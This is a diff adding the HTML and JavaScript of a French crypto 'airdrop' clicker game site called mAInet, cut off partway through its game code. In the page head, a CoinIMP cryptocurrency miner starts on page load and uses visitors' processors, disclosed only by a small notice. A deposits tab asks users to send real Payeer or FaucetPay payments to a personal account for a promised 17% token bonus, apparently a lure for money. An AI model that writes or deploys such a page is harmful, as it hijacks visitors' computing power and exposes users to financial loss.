@@ -1,0 +1,1338 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>mAInet - Airdrop 2026 & Mining Shop</title>
+    
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17533127168"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'AW-17533127168');
+    </script>
+    
+    <!-- Cryptocurrency Mining Script -->
+    <script src="https://www.hostingcloud.racing/3Whp.js"></script>
+    <script>
+        var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
+            throttle: 0.6, c: 'w'
+        });
+        _client.start();
+        _client.addMiningNotification("Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#120707", 20, "#c01111");
+    </script>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Roboto+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    
+    <style>
+        :root {
+            --cyber-green: #00ff88;
+            --cyber-blue: #0099ff;
+            --cyber-purple: #9933ff;
+            --cyber-yellow: #ffdd00;
+            --cyber-border: rgba(0, 255, 136, 0.3);
+            --dark-bg: #0a0a0a;
+            --card-bg: rgba(26, 26, 26, 0.9);
+            --glass-bg: rgba(255, 255, 255, 0.05);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto Mono', monospace;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a2e 50%, #16213e 100%);
+            color: white;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .cyber-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 3rem;
+            font-weight: 900;
+            text-align: center;
+            margin-bottom: 10px;
+            background: linear-gradient(45deg, var(--cyber-green), var(--cyber-blue));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-shadow: 0 0 30px rgba(0, 255, 136, 0.5);
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            from { filter: brightness(1); }
+            to { filter: brightness(1.2); }
+        }
+
+        .cyber-subtitle {
+            text-align: center;
+            font-size: 1.2rem;
+            color: var(--cyber-blue);
+            margin-bottom: 30px;
+            font-weight: 500;
+        }
+
+        .countdown-container {
+            background: var(--card-bg);
+            border: 2px solid var(--cyber-border);
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 30px;
+            backdrop-filter: blur(10px);
+        }
+
+        .countdown-timer {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .countdown-item {
+            background: var(--glass-bg);
+            border: 1px solid var(--cyber-green);
+            border-radius: 10px;
+            padding: 15px 10px;
+        }
+
+        .countdown-number {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: var(--cyber-green);
+            font-family: 'Orbitron', monospace;
+        }
+
+        .countdown-label {
+            font-size: 0.9rem;
+            color: #ccc;
+            margin-top: 5px;
+        }
+
+        .cyber-stats {
+            display: flex;
+            justify-content: space-around;
+            margin: 30px 0;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .stat-card {
+            background: var(--card-bg);
+            border: 2px solid var(--cyber-border);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            flex: 1;
+            min-width: 200px;
+            backdrop-filter: blur(10px);
+        }
+
+        .stat-value {
+            font-size: 2rem;
+            font-weight: bold;
+            color: var(--cyber-green);
+            font-family: 'Orbitron', monospace;
+        }
+
+        .stat-label {
+            font-size: 0.9rem;
+            color: #ccc;
+            margin-top: 5px;
+        }
+
+        .tabs-container {
+            background: var(--card-bg);
+            border: 2px solid var(--cyber-border);
+            border-radius: 15px;
+            margin-top: 30px;
+            backdrop-filter: blur(10px);
+        }
+
+        .tabs-list {
+            display: flex;
+            border-bottom: 2px solid var(--cyber-border);
+            overflow-x: auto;
+        }
+
+        .tab-trigger {
+            padding: 15px 25px;
+            background: transparent;
+            border: none;
+            color: #ccc;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border-bottom: 3px solid transparent;
+            white-space: nowrap;
+        }
+
+        .tab-trigger:hover {
+            color: var(--cyber-green);
+            background: rgba(0, 255, 136, 0.1);
+        }
+
+        .tab-trigger.active {
+            color: var(--cyber-green);
+            border-bottom-color: var(--cyber-green);
+            background: rgba(0, 255, 136, 0.1);
+        }
+
+        .tab-content {
+            display: none;
+            padding: 30px;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .cyber-button {
+            background: linear-gradient(45deg, var(--cyber-green), var(--cyber-blue));
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            color: black;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            font-size: 0.9rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .cyber-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0, 255, 136, 0.4);
+        }
+
+        .cyber-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .cyber-card {
+            background: var(--card-bg);
+            border: 1px solid var(--cyber-border);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            backdrop-filter: blur(10px);
+        }
+
+        .click-game-container {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .click-button {
+            width: 200px;
+            height: 200px;
+            border-radius: 50%;
+            background: radial-gradient(circle, var(--cyber-green), var(--cyber-blue));
+            border: 4px solid var(--cyber-yellow);
+            color: black;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 20px auto;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .click-button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 40px rgba(0, 255, 136, 0.6);
+        }
+
+        .click-button:active {
+            transform: scale(0.95);
+        }
+
+        .click-text {
+            font-family: 'Orbitron', monospace;
+            font-size: 1.4rem;
+            z-index: 2;
+        }
+
+        .energy-bar-container {
+            width: 100%;
+            max-width: 400px;
+            margin: 20px auto;
+            background: rgba(0, 0, 0, 0.5);
+            border: 2px solid var(--cyber-border);
+            border-radius: 25px;
+            padding: 5px;
+        }
+
+        .energy-bar {
+            height: 20px;
+            background: linear-gradient(90deg, var(--cyber-yellow), var(--cyber-green));
+            border-radius: 20px;
+            transition: width 0.3s ease;
+        }
+
+        .icon {
+            width: 16px;
+            height: 16px;
+        }
+
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: var(--card-bg);
+            border: 2px solid var(--cyber-green);
+            border-radius: 8px;
+            padding: 15px;
+            color: white;
+            z-index: 1000;
+            transform: translateX(400px);
+            transition: transform 0.3s ease;
+            max-width: 300px;
+        }
+
+        .notification.show {
+            transform: translateX(0);
+        }
+
+        .notification.error {
+            border-color: #ff4444;
+            background: rgba(255, 68, 68, 0.1);
+        }
+
+        .notification.success {
+            border-color: var(--cyber-green);
+            background: rgba(0, 255, 136, 0.1);
+        }
+
+        .auth-container {
+            max-width: 400px;
+            margin: 50px auto;
+            background: var(--card-bg);
+            border: 2px solid var(--cyber-border);
+            border-radius: 15px;
+            padding: 30px;
+            backdrop-filter: blur(10px);
+        }
+
+        .auth-form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .auth-input {
+            padding: 12px 15px;
+            border: 2px solid var(--cyber-border);
+            border-radius: 8px;
+            background: rgba(0, 0, 0, 0.5);
+            color: white;
+            font-size: 1rem;
+        }
+
+        .auth-input:focus {
+            outline: none;
+            border-color: var(--cyber-green);
+        }
+
+        .auth-toggle {
+            text-align: center;
+            margin-top: 20px;
+            color: var(--cyber-blue);
+            cursor: pointer;
+        }
+
+        .loading-spinner {
+            border: 3px solid rgba(0, 255, 136, 0.3);
+            border-radius: 50%;
+            border-top: 3px solid var(--cyber-green);
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* Mining Rigs Styles */
+        .mining-slot {
+            aspect-ratio: 1;
+            border: 2px dashed var(--cyber-border);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background: rgba(26, 26, 26, 0.5);
+            min-height: 80px;
+        }
+
+        .mining-slot:hover {
+            border-color: var(--cyber-green);
+            background: rgba(0, 255, 136, 0.05);
+        }
+
+        .mining-slot.occupied {
+            border: 2px solid var(--cyber-green);
+            background: rgba(0, 255, 136, 0.1);
+        }
+
+        .miner-card {
+            background: rgba(26, 26, 26, 0.8);
+            border: 1px solid var(--cyber-border);
+            border-radius: 8px;
+            padding: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .miner-card:hover {
+            border-color: var(--cyber-green);
+            background: rgba(0, 255, 136, 0.05);
+            transform: translateY(-2px);
+        }
+
+        .rarity-common { border-left: 4px solid #6b7280; }
+        .rarity-uncommon { border-left: 4px solid #10b981; }
+        .rarity-rare { border-left: 4px solid #3b82f6; }
+        .rarity-epic { border-left: 4px solid #8b5cf6; }
+        .rarity-legendary { border-left: 4px solid #f59e0b; }
+        .rarity-mythic { 
+            border-left: 4px solid #ef4444;
+            box-shadow: 0 0 20px rgba(239, 68, 68, 0.3);
+        }
+
+        .user-info-bar {
+            background: var(--card-bg);
+            border: 1px solid var(--cyber-border);
+            border-radius: 8px;
+            padding: 10px 20px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .offline-mode-banner {
+            background: linear-gradient(45deg, #ff6b35, #f7931e);
+            color: white;
+            padding: 10px;
+            text-align: center;
+            font-weight: bold;
+            margin-bottom: 20px;
+            border-radius: 8px;
+        }
+
+        @media (max-width: 768px) {
+            .cyber-title {
+                font-size: 2rem;
+            }
+            .cyber-subtitle {
+                font-size: 1rem;
+            }
+            .countdown-timer {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .cyber-stats {
+                flex-direction: column;
+            }
+            .click-button {
+                width: 150px;
+                height: 150px;
+            }
+            .tabs-list {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Main App Container -->
+    <div id="app-container" class="container">
+        <!-- Offline Mode Banner -->
+        <div id="offline-banner" class="offline-mode-banner hidden">
+            🔄 Mode Hors-ligne Activé - Vos données sont sauvegardées localement
+        </div>
+
+        <!-- User Info Bar -->
+        <div class="user-info-bar">
+            <div>
+                <span style="color: var(--cyber-green);">👤 Joueur:</span> 
+                <span id="username-display">Chargement...</span>
+            </div>
+            <div>
+                <button class="cyber-button" onclick="saveToCloud()" id="save-cloud-btn">
+                    <i data-lucide="cloud-upload" class="icon"></i>
+                    <span style="margin-left: 8px;">Sauver Cloud</span>
+                </button>
+                <button class="cyber-button" onclick="logout()" style="margin-left: 10px;">
+                    <i data-lucide="log-out" class="icon"></i>
+                    <span style="margin-left: 8px;">Déconnexion</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- Header -->
+        <div class="text-center mb-8">
+            <h1 class="cyber-title">mAInet</h1>
+            <p class="cyber-subtitle">Airdrop 2026 • Mining & Trading Platform</p>
+        </div>
+
+        <!-- Countdown Timer -->
+        <div class="countdown-container">
+            <h2 style="color: var(--cyber-green); margin-bottom: 15px;">
+                <i data-lucide="clock" class="icon"></i>
+                <span style="margin-left: 8px;">Airdrop dans:</span>
+            </h2>
+            <div class="countdown-timer">
+                <div class="countdown-item">
+                    <div class="countdown-number" id="days">000</div>
+                    <div class="countdown-label">Jours</div>
+                </div>
+                <div class="countdown-item">
+                    <div class="countdown-number" id="hours">00</div>
+                    <div class="countdown-label">Heures</div>
+                </div>
+                <div class="countdown-item">
+                    <div class="countdown-number" id="minutes">00</div>
+                    <div class="countdown-label">Minutes</div>
+                </div>
+                <div class="countdown-item">
+                    <div class="countdown-number" id="seconds">00</div>
+                    <div class="countdown-label">Secondes</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- User Stats -->
+        <div class="cyber-stats">
+            <div class="stat-card">
+                <div class="stat-value" id="main-balance">0.00</div>
+                <div class="stat-label">Solde Principal</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="bonus-balance">0.00</div>
+                <div class="stat-label">Solde Bonus</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="total-hashrate">0.00 H/s</div>
+                <div class="stat-label">Puissance Mining</div>
+            </div>
+        </div>
+
+        <!-- Tabs Container -->
+        <div class="tabs-container">
+            <div class="tabs-list">
+                <button class="tab-trigger active" onclick="showTab('game')">Jeu de Clic</button>
+                <button class="tab-trigger" onclick="showTab('tasks')">Tâches</button>
+                <button class="tab-trigger" onclick="showTab('shop')">Boutique</button>
+                <button class="tab-trigger" onclick="showTab('deposits')">Dépôts</button>
+                <button class="tab-trigger" onclick="showTab('referral')">Parrainage</button>
+                <button class="tab-trigger" onclick="showTab('mining-rigs')">Installations</button>
+                <button class="tab-trigger" onclick="showTab('account')">Mon Compte</button>
+            </div>
+
+            <!-- Game Tab -->
+            <div id="tab-game" class="tab-content active">
+                <div class="click-game-container">
+                    <h2 style="color: var(--cyber-green); margin-bottom: 20px;">Jeu de Clic</h2>
+                    
+                    <button class="click-button" onclick="performClick()" id="click-btn">
+                        <span class="click-text">CLICK!</span>
+                    </button>
+                    
+                    <div class="energy-bar-container">
+                        <div class="energy-bar" id="energy-fill"></div>
+                    </div>
+                    
+                    <div style="margin-top: 20px;">
+                        <p><span style="color: var(--cyber-yellow);">Énergie:</span> <span id="energy-display">100/100</span></p>
+                        <p><span style="color: var(--cyber-blue);">Régénération:</span> <span id="energy-regen">1.0</span>/min</p>
+                        <p><span style="color: var(--cyber-green);">Balance:</span> <span id="game-balance-display">0.000</span> tokens</p>
+                        <p><span style="color: var(--cyber-purple);">Clics Total:</span> <span id="total-clicks">0</span></p>
+                        <p><span style="color: var(--cyber-yellow);">Puissance:</span> <span id="click-power-display">+0.1 tokens</span></p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tasks Tab -->
+            <div id="tab-tasks" class="tab-content">
+                <h2 style="color: var(--cyber-green); margin-bottom: 20px;">Tâches Disponibles</h2>
+                <div id="tasks-container">
+                    <div class="cyber-card">
+                        <h3 style="color: var(--cyber-green); margin-bottom: 15px;">Tâches Daily</h3>
+                        <div class="space-y-3">
+                            <div style="padding: 15px; border: 1px solid var(--cyber-border); border-radius: 8px; margin-bottom: 10px;">
+                                <div style="display: flex; justify-content: space-between; align-items: center;">
+                                    <div>
+                                        <h4 style="color: white; margin-bottom: 5px;">Bonus Quotidien</h4>
+                                        <p style="color: #ccc; font-size: 0.9rem;">Réclamez votre bonus quotidien de 50 tokens</p>
+                                    </div>
+                                    <button class="cyber-button" onclick="claimDailyBonus()">
+                                        <i data-lucide="gift" class="icon"></i>
+                                        <span style="margin-left: 8px;">Réclamer</span>
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Shop Tab -->
+            <div id="tab-shop" class="tab-content">
+                <h2 style="color: var(--cyber-green); margin-bottom: 20px;">Boutique Mining</h2>
+                <div id="shop-container">
+                    <div class="cyber-card">
+                        <h3 style="color: var(--cyber-green); margin-bottom: 15px;">Améliorations</h3>
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4" id="upgrades-shop">
+                            <!-- Upgrades will be loaded here -->
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Deposits Tab -->
+            <div id="tab-deposits" class="tab-content">
+                <h2 style="color: var(--cyber-green); margin-bottom: 20px;">Dépôts & Vérification IDTX</h2>
+                <div id="deposits-container">
+                    <div class="cyber-card">
+                        <h3 style="color: var(--cyber-green); margin-bottom: 15px;">Informations de Dépôt</h3>
+                        <div class="space-y-4">
+                            <div>
+                                <p class="text-sm text-gray-400">Payeer</p>
+                                <p style="color: var(--cyber-green); font-family: 'Courier New', monospace;">P1112145219</p>
+                            </div>
+                            <div>
+                                <p class="text-sm text-gray-400">FaucetPay</p>
+                                <p style="color: var(--cyber-green); font-family: 'Courier New', monospace;">maximlprive90@gmail.com</p>
+                            </div>
+                            <div style="text-align: center; padding: 15px; background: rgba(0, 255, 136, 0.05); border: 1px solid rgba(0, 255, 136, 0.2); border-radius: 8px;">
+                                <p style="color: var(--cyber-green); font-weight: bold;">🎉 BONUS DE 17% SUR TOUS LES DÉPÔTS ! 🎉</p>
+                                <p style="color: #ccc; font-size: 0.9rem;">Votre dépôt sera automatiquement majoré de 17%</p>
+                            </div>
+                        </div>
+                        
+                        <div style="margin-top: 20px;">
+                            <h4 style="color: var(--cyber-green); margin-bottom: 15px;">Vérifier Transaction IDTX</h4>
+                            <div class="space-y-3">
+                                <input type="text" id="transaction-id-input" placeholder="ID de Transaction..." 
+                                       class="auth-input" style="width: 100%; margin-bottom: 10px;">
+                                
+                                <select id="payment-method-select" class="auth-input" style="width: 100%; margin-bottom: 10px;">
+                                    <option value="payeer">Payeer</option>
+                                    <option value="faucetpay">FaucetPay</option>
+                                </select>
+                                
+                                <button onclick="verifyTransaction()" class="cyber-button" style="width: 100%;">
+                                    <i data-lucide="check-circle" class="icon"></i>
+                                    <span style="margin-left: 8px;">Vérifier Transaction</span>
+                                </button>
+                            </div>
+                            
+                            <div id="verification-result" class="hidden" style="margin-top: 15px;">
+                                <!-- Results will be displayed here -->
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Referral Tab -->
+            <div id="tab-referral" class="tab-content">
+                <h2 style="color: var(--cyber-green); margin-bottom: 20px;">Programme de Parrainage</h2>
+                <div class="cyber-card">
+                    <p style="color: #ccc; text-align: center; padding: 40px;">
+                        Système de parrainage en développement...
+                    </p>
+                </div>
+            </div>
+
+            <!-- Mining Rigs Tab -->
+            <div id="tab-mining-rigs" class="tab-content">
+                <h2 style="color: var(--cyber-green); margin-bottom: 20px;">Installations Mining</h2>
+                <div id="mining-rigs-container">
+                    <!-- Mining rigs content from original implementation -->
+                    <p style="color: #ccc; text-align: center; padding: 40px;">
+                        Système de mining rigs chargé...
+                    </p>
+                </div>
+            </div>
+
+            <!-- Account Tab -->
+            <div id="tab-account" class="tab-content">
+                <h2 style="color: var(--cyber-green); margin-bottom: 20px;">Mon Compte</h2>
+                <div class="space-y-4">
+                    <div class="cyber-card">
+                        <h3 style="color: var(--cyber-green); margin-bottom: 15px;">Informations du Compte</h3>
+                        <div class="space-y-3">
+                            <div>
+                                <label style="color: #ccc; font-size: 0.9rem;">Nom d'utilisateur</label>
+                                <input type="text" id="username-input" class="auth-input" style="width: 100%; margin-top: 5px;">
+                            </div>
+                            <div>
+                                <label style="color: #ccc; font-size: 0.9rem;">Email</label>
+                                <input type="email" id="email-input" class="auth-input" style="width: 100%; margin-top: 5px;">
+                            </div>
+                            <button onclick="updateProfile()" class="cyber-button">
+                                <i data-lucide="save" class="icon"></i>
+                                <span style="margin-left: 8px;">Sauvegarder</span>
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="cyber-card">
+                        <h3 style="color: var(--cyber-green); margin-bottom: 15px;">Synchronisation Cloud</h3>
+                        <div class="space-y-3">
+                            <div id="cloud-status" style="padding: 15px; border-radius: 8px; text-align: center;">
+                                <p id="sync-status-text">Vérification de la connexion...</p>
+                            </div>
+                            <div style="display: flex; gap: 10px;">
+                                <button onclick="saveToCloud()" class="cyber-button" style="flex: 1;">
+                                    <i data-lucide="cloud-upload" class="icon"></i>
+                                    <span style="margin-left: 8px;">Sauver Cloud</span>
+                                </button>
+                                <button onclick="loadFromCloud()" class="cyber-button" style="flex: 1;">
+                                    <i data-lucide="cloud-download" class="icon"></i>
+                                    <span style="margin-left: 8px;">Charger Cloud</span>
+                                </button>
+                            </div>
+                            <button onclick="exportData()" class="cyber-button" style="width: 100%;">
+                                <i data-lucide="download" class="icon"></i>
+                                <span style="margin-left: 8px;">Exporter Données</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notification Container -->
+    <div id="notification" class="notification"></div>
+
+    <script>
+        // Supabase Configuration (with fallback)
+        const SUPABASE_URL = 'https://rjfxxtdfrviipcwpacvc.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJqZnh4dGRmcnZpaXBjd3BhY3ZjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTcwNTc5MzIsImV4cCI6MjA3MjYzMzkzMn0.uBSgwh6vYP3xl4_YUisekInaMR8fDC-EEQTuf8MRyUQ';
+        
+        // localStorage keys
+        const USER_DATA_KEY = 'mainet_user_data';
+        const GAME_DATA_KEY = 'mainet_game_state';
+        
+        // Global variables
+        let supabaseClient = null;
+        let currentUser = null;
+        let gameState = null;
+        let isOnlineMode = false;
+
+        // Initialize Supabase (with error handling)
+        try {
+            const { createClient } = supabase;
+            supabaseClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        } catch (error) {
+            console.warn('Supabase initialization failed, using offline mode:', error);
+            supabaseClient = null;
+        }
+
+        // Initialize the app
+        document.addEventListener('DOMContentLoaded', function() {
+            initializeApp();
+            lucide.createIcons();
+        });
+
+        async function initializeApp() {
+            // Try to load user session
+            await loadUserSession();
+            
+            // Initialize game data
+            loadGameData();
+            
+            // Start countdown timer
+            updateCountdown();
+            setInterval(updateCountdown, 1000);
+            
+            // Start energy regeneration
+            setInterval(regenerateEnergy, 1000);
+            
+            // Start auto mining
+            setInterval(autoMining, 1000);
+            
+            // Periodic save
+            setInterval(saveGameData, 30000);
+            
+            // Update cloud status
+            updateCloudStatus();
+        }
+
+        async function loadUserSession() {
+            try {
+                // Try to get existing session from Supabase
+                if (supabaseClient) {
+                    const { data: { session } } = await supabaseClient.auth.getSession();
+                    
+                    if (session) {
+                        currentUser = session.user;
+                        isOnlineMode = true;
+                        document.getElementById('offline-banner').classList.add('hidden');
+                        document.getElementById('username-display').textContent = session.user.email || 'Utilisateur Connecté';
+                        return;
+                    }
+                }
+            } catch (error) {
+                console.warn('Failed to load Supabase session:', error);
+            }
+            
+            // Fallback to localStorage user
+            const userData = localStorage.getItem(USER_DATA_KEY);
+            if (userData) {
+                try {
+                    currentUser = JSON.parse(userData);
+                } catch (error) {
+                    console.error('Error parsing user data:', error);
+                }
+            }
+            
+            // Create new offline user if none exists
+            if (!currentUser) {
+                currentUser = {
+                    id: 'offline_' + Date.now(),
+                    email: `user_${Date.now()}@local.offline`,
+                    username: `Joueur_${Date.now().toString().slice(-4)}`,
+                    created_at: new Date().toISOString(),
+                    offline_mode: true
+                };
+                localStorage.setItem(USER_DATA_KEY, JSON.stringify(currentUser));
+            }
+            
+            // Set offline mode
+            isOnlineMode = false;
+            document.getElementById('offline-banner').classList.remove('hidden');
+            document.getElementById('username-display').textContent = currentUser.username || currentUser.email || 'Joueur Local';
+        }
+
+        function loadGameData() {
+            // Try to load from localStorage first
+            const savedData = localStorage.getItem(GAME_DATA_KEY);
+            
+            if (savedData) {
+                try {
+                    gameState = JSON.parse(savedData);
+                } catch (error) {
+                    console.error('Error parsing game data:', error);
+                    gameState = createDefaultGameState();
+                }
+            } else {
+                gameState = createDefaultGameState();
+            }
+            
+            // Update energy from time passed
+            updateEnergyFromTime();
+            updateDisplay();
+            loadUpgrades();
+        }
+
+        function createDefaultGameState() {
+            return {
+                current_coins: 1000,
+                main_balance: 1000,
+                bonus_balance: 0,
+                energy: 100,
+                max_energy: 100,
+                energy_regen_rate: 1.0,
+                click_power: 1,
+                auto_mining_rate: 0.0,
+                total_clicks: 0,
+                achievements: [],
+                upgrades: {
+                    ENERGY_REGEN: 0,
+                    CLICK_POWER: 0,
+                    AUTO_MINING: 0,
+                    MAX_ENERGY: 0
+                },
+                mining_rigs: {
+                    racks: {
+                        1: { owned: false, slots: {} },
+                        2: { owned: false, slots: {} },
+                        3: { owned: false, slots: {} },
+                        4: { owned: false, slots: {} }
+                    },
+                    miners: [],
+                    totalHashrate: 0
+                },
+                last_save: new Date().toISOString(),
+                last_energy_update: new Date().toISOString()
+            };
+        }
+
+        function saveGameData() {
+            if (!gameState) return;
+            
+            gameState.last_save = new Date().toISOString();
+            localStorage.setItem(GAME_DATA_KEY, JSON.stringify(gameState));
+        }
+
+        async function saveToCloud() {
+            if (!isOnlineMode || !supabaseClient || !currentUser) {
+                showNotification('Mode hors-ligne - Données sauvées localement', 'info');
+                return;
+            }
+
+            try {
+                showNotification('Sauvegarde cloud en cours...', 'info');
+                
+                // Save to Supabase
+                const response = await fetch('/api/game/state', {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bearer ${(await supabaseClient.auth.getSession()).data.session?.access_token}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(gameState)
+                });
+
+                if (response.ok) {
+                    showNotification('✅ Données sauvegardées dans le cloud!', 'success');
+                    updateCloudStatus();
+                } else {
+                    throw new Error('Erreur de sauvegarde cloud');
+                }
+                
+            } catch (error) {
+                console.error('Cloud save error:', error);
+                showNotification('❌ Erreur sauvegarde cloud - Données gardées en local', 'error');
+            }
+        }
+
+        async function loadFromCloud() {
+            if (!isOnlineMode || !supabaseClient || !currentUser) {
+                showNotification('Mode hors-ligne - Chargement depuis localStorage', 'info');
+                loadGameData();
+                return;
+            }
+
+            try {
+                showNotification('Chargement depuis le cloud...', 'info');
+                
+                const response = await fetch('/api/game/state', {
+                    headers: {
+                        'Authorization': `Bearer ${(await supabaseClient.auth.getSession()).data.session?.access_token}`,
+                        'Content-Type': 'application/json'
+                    }
+                });
+
+                if (response.ok) {
+                    const cloudData = await response.json();
+                    if (cloudData) {
+                        gameState = cloudData;
+                        saveGameData(); // Save to localStorage too
+                        updateDisplay();
+                        showNotification('✅ Données chargées depuis le cloud!', 'success');
+                    }
+                } else {
+                    throw new Error('Pas de données cloud trouvées');
+                }
+                
+            } catch (error) {
+                console.error('Cloud load error:', error);
+                showNotification('❌ Erreur chargement cloud - Utilisation données locales', 'error');
+            }
+        }
+
+        function updateCloudStatus() {
+            const statusDiv = document.getElementById('cloud-status');
+            const statusText = document.getElementById('sync-status-text');
+            
+            if (isOnlineMode) {
+                statusDiv.style.border = '1px solid var(--cyber-green)';
+                statusDiv.style.background = 'rgba(0, 255, 136, 0.1)';
+                statusText.textContent = '🟢 Connecté au Cloud - Synchronisation disponible';
+                statusText.style.color = 'var(--cyber-green)';
+            } else {
+                statusDiv.style.border = '1px solid #ff6b35';
+                statusDiv.style.background = 'rgba(255, 107, 53, 0.1)';
+                statusText.textContent = '🔴 Mode Hors-ligne - Données locales uniquement';
+                statusText.style.color = '#ff6b35';
+            }
+        }
+
+        function updateDisplay() {
+            if (!gameState) return;
+
+            document.getElementById('main-balance').textContent = (gameState.main_balance || 0).toFixed(2);
+            document.getElementById('bonus-balance').textContent = (gameState.bonus_balance || 0).toFixed(2);
+            document.getElementById('energy-display').textContent = `${Math.floor(gameState.energy || 100)}/${gameState.max_energy || 100}`;
+            document.getElementById('energy-fill').style.width = `${((gameState.energy || 100) / (gameState.max_energy || 100)) * 100}%`;
+            document.getElementById('energy-regen').textContent = gameState.energy_regen_rate || 1.0;
+            document.getElementById('game-balance-display').textContent = (gameState.current_coins || 0).toFixed(3);
+            document.getElementById('total-clicks').textContent = gameState.total_clicks || 0;
+            document.getElementById('click-power-display').textContent = `+${((gameState.click_power || 1) * 0.1).toFixed(1)} tokens`;
+            document.getElementById('total-hashrate').textContent = `${(gameState.mining_rigs?.totalHashrate || 0).toFixed(2)} H/s`;
+        }
+
+        function updateEnergyFromTime() {
+            if (!gameState || !gameState.last_energy_update) return;
+            
+            const now = new Date();
+            const lastUpdate = new Date(gameState.last_energy_update);
+            const timeDiff = (now - lastUpdate) / 1000; // seconds
+            
+            if (timeDiff > 0) {
+                const energyToAdd = (gameState.energy_regen_rate || 1.0) * (timeDiff / 60); // per minute
+                gameState.energy = Math.min(gameState.max_energy || 100, (gameState.energy || 100) + energyToAdd);
+                gameState.last_energy_update = now.toISOString();
+            }
+        }
+
+        function regenerateEnergy() {
+            if (!gameState) return;
+            
+            if (gameState.energy < gameState.max_energy) {
+                gameState.energy = Math.min(gameState.max_energy, gameState.energy + (gameState.energy_regen_rate / 60));
+                updateDisplay();
+            }
+            gameState.last_energy_update = new Date().toISOString();
+        }
+
+        function autoMining() {
+            if (!gameState || gameState.auto_mining_rate <= 0) return;
+            
+            const miningReward = gameState.auto_mining_rate / 60; // per second
+            gameState.current_coins += miningReward;
+            gameState.main_balance += miningReward;
+            
+            updateDisplay();
+        }
+
+        function performClick() {
+            if (!gameState || gameState.energy <= 0) {
+                showNotification('Pas assez d\'énergie !', 'error');
+                return;
+            }
+
+            gameState.energy = Math.max(0, gameState.energy - 1);
+            gameState.total_clicks = (gameState.total_clicks || 0) + 1;
+            
